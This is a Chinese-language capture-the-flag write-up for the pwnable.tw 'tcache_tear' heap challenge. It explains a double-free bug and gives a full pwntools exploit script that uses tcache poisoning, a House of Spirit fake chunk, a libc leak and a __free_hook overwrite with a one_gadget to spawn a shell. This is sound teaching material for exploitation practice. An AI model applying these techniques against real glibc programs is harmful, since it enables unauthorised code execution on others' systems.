---
layout: post
title: pwnable.tw tcache_tear
date: 2023-02-01 15:16:30
tags: pwnable.tw
---

## 程序分析

GLIBC 2.27 64bits，关闭了 PIE。
菜单题，提供了 alloc、free、info、exit 四个功能。

1. 通过 alloc，用户可以自由申请小于 0xff（不含 chunk header）大小的区块并向其中填入 size-0x16 个任意字符（奇怪的限制）。整个程序只有一个放指针的槽位，是一个全局符号，记为gptr。
2. 通过 free，用户可以释放全局符号 gptr 指向的空间。但程序使用局部变量作了限制，程序最多只能 free 8 次。**漏洞：free 完没有清空指针**
3. 通过 info，用户可以用 write 打印全局符号 name 处的值。这个符号本没有名字，但程序一开始会让我们输入一个 name 存储在这个符号的位置，所以就叫他 name。
4. 通过 exit，用户可以退出程序。

程序没有什么自带的后门函数，orw 的三个函数都不齐。

## 思路

结合分析可以看出，必须要泄露 libc 基址才能搞事情。所以需要在 2.27 的版本下，想办法绕过 tcache 让 chunk 进入 unsorted bin 来获取 libc 地址。
程序的唯一打印功能是打印固定地址处的内容，所以还需要用 house of spirit 的思想在 name 处构造假区块。

综上，攻击步骤有如下几步：
1. 构造 fake chunk 头部
2. 构造 fake chunk 尾部，保证通过 free 的检查
3. 释放 fake chunk 进入 unsorted bin
4. 使用 info 功能泄露 libc 基址
5. 覆写 `__free_hook` 为 one_gadget

## 具体实现

### 构造 fake chunk

为了完成 House of Spirit 攻击，我们需要精心构造 fake chunk。
首先，为了不被分进 fastbins，chunksize 需要>=0x90，这里就使用 0x90。
其次，为了不与别的 chunk 合并，首先低位的 chunk 通过 0x91 的 1 来解决；高位的 chunk 就需要再构造两个 fake chunk，如下图所示：

```
├──────┬──────┤  │
│      │0x21  │  │
├──────┴──────┤ ─┼─ Name+0xb0
│             │  │
├──────┬──────┤  │
│      │0x21  │  │
├──────┴──────┤ ─┼─ Name+0x90
│             │  │
│             │  │ Fake Chunk
│             │  │
│             │  │ beyond fastbin
│             │  │
│             │  │
│             │  │
│             │  │
│             │  │
├──────┬──────┤  │
│      │0x91  │  │
├──────┴──────┤ ─┼─ Name
```

fake chunk 的头部可以程序开始的时候输入 Name 0x91 来完成。高位的两个 fake chunk 就需要使用 tcache dub 然后 poisoning 来完成了，代码如下：

```python
# fake chunk header
name = b'a'*0x8 + pack(0x91)
io.send(name)

# fake chunk tail
alloc(0x40, b'\n')
free()
free()
alloc(0x40, pack(0x6020f0))     # 0x602060 + 0x90
alloc(0x40, b'\n')
alloc(0x40, pack(0) + pack(0x21) + pack(0)*3 + pack(0x21))
```

### 泄露 libc

构造完了 fake chunk，我们需要通过释放它来达到目的。为此我们有两种方法：一种是覆写全局 gp 为 fake chunk 地址；另一种是 poisoning tcache 把 fake chunk 取出，这里我们随便地采用后者。

```python
# alloc fake chunk
alloc(0x80, b'\n')
free()
free()
alloc(0x80, pack(0x602070))     # 0x602060 + 0x10
alloc(0x80, b'\n')
alloc(0x80, b"I'm a fake chunk")
```

然后就可以释放并泄露 libc 基址了：

```python
# free fake chunk into unsorted bin
free()

# leak libc's base address
info()
libc_addr = unpack(io.recvuntil(b'\x7f')[-6:]+b'\0\0')-0x3ebca0
success("libc :" + hex(libc_addr))
```

### 覆写 hook

有了 libc 基址，再加上 tcache 的任意写能力，就可以把 hook 覆写为 one_gadget 来完成攻击。脚本如下：

```python
free_hook = libc_addr + libc.symbols["__free_hook"]
one_gadget = libc_addr + 0x4f322 # 0x10a38c

alloc(0x60, b'\n')
free()
free()
alloc(0x60, pack(free_hook))
alloc(0x60, b'\n')
alloc(0x60, pack(one_gadget))

free()
```

## 完整脚本

```python
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./pwn"
io = process([filename])
# io = remote("chall.pwnable.tw", 10207)
elf = ELF(filename)

libc_name = "./libc.so"
libc = ELF(libc_name)

def alloc(size, content):
    io.recvuntil(b"choice :")
    io.sendline(b"1")
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode('ascii'))
    io.recvuntil(b"Data:")
    io.send(content)

def free():
    io.recvuntil(b"choice :")
    io.sendline(b"2")

def info():
    io.recvuntil(b"choice :")
    io.sendline(b"3")
    
def exit():
    io.recvuntil(b"choice :")
    io.sendline(b"4")

# --- stage 1 : leak libc_addr ---

# fake chunk header
name = b'a'*0x8 + pack(0x91)
io.send(name)

# fake chunk tail
alloc(0x40, b'\n')
free()
free()
alloc(0x40, pack(0x6020f0))     # 0x602060 + 0x90
alloc(0x40, b'\n')
alloc(0x40, pack(0) + pack(0x21) + pack(0)*3 + pack(0x21))

# alloc fake chunk
alloc(0x80, b'\n')
free()
free()
alloc(0x80, pack(0x602070))     # 0x602060 + 0x10
alloc(0x80, b'\n')
alloc(0x80, b'haha')

# free fake chunk into unsorted bin
free()

# leak libc's base address
info()
libc_addr = unpack(io.recvuntil(b'\x7f')[-6:]+b'\0\0')-0x3ebca0
success("libc :" + hex(libc_addr))

# --- stage 2 : overwrite hook ---

free_hook = libc_addr + libc.symbols["__free_hook"]
one_gadget = libc_addr + 0x4f322 # 0x10a38c

alloc(0x60, b'\n')
free()
free()
alloc(0x60, pack(free_hook))
alloc(0x60, b'\n')
alloc(0x60, pack(one_gadget))

# --- stage 3 : pwn ---

free()
io.interactive()
```
